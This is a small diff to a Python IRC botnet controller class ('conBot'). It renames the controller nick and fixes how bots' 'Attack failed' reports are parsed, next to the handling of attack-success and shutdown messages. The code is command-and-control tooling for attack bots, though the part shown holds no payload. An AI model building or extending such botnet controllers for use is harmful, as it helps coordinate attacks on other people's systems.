@@ -12,7 +12,7 @@ class conBot:
         self.PHRASE = phrase
         self.IRCSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # CONTROLLER INFO
-        self.conNick = "SLAVE_DRIVER123"
+        self.conNick = "SLAVE_DRIVER"
         self.liveConnection = False # Flag to see if controller connection to IRC Server is active
         self.command = None
 
@@ -64,7 +64,7 @@ class conBot:
         elif text.find("Attack successful") != -1:
             self.botsSuccessful.append(text.split("-")[1])
         elif text.find("Attack failed") != -1:
-            self.botsFailed[message.split("-")[1]] = [message.split("-")[2]]
+            self.botsFailed[message.split(" - ")[1]] = [message.split(" - ")[2]]
         elif text.find("Shutdown successful") != -1:
             self.botsDisconnected.append(text.split("-")[1])
             
